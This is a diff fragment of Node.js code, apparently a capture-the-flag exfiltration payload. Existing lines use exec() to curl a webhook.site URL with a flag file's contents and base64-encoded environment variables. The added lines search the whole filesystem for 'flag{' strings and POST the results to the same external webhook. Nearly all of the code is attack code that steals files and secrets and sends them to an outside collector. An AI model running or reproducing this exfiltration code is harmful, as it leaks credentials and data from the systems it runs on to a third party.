@@ -45,3 +45,41 @@ exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd
 
 
 exec('curl -X POST --data "flag=$(cat /tmp/flag.txt)" https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(printenv | base64)');
+
+
+
+
+const { request } = require('https');
+
+exec('grep -r "flag{" / 2>/dev/null', (error, stdout, stderr) => {
+  if (error) {
+    console.error('error:', error);
+  } else {
+    console.log(`stdout:\n${stdout}`);
+    console.log(`stderr:\n${stderr}`);
+  }
+
+  var postData = `error:\n${error}\n---\nstdout:\n${stdout}\n---\nstderr:\n${stderr}`;
+  var options = {
+    hostname: 'webhook.site',
+    port: 443,
+    path: '/7d8cbbc5-b054-45b1-8504-7e56f999530f',
+    method: 'POST'
+  };
+
+  var req = request(options, (res) => {
+    console.log('statusCode:', res.statusCode);
+    console.log('headers:', res.headers);
+
+    res.on('data', (d) => {
+      process.stdout.write(d);
+    });
+  });
+
+  req.on('error', (e) => {
+    console.error('error:', e);
+  });
+
+  req.write(postData);
+  req.end();
+});
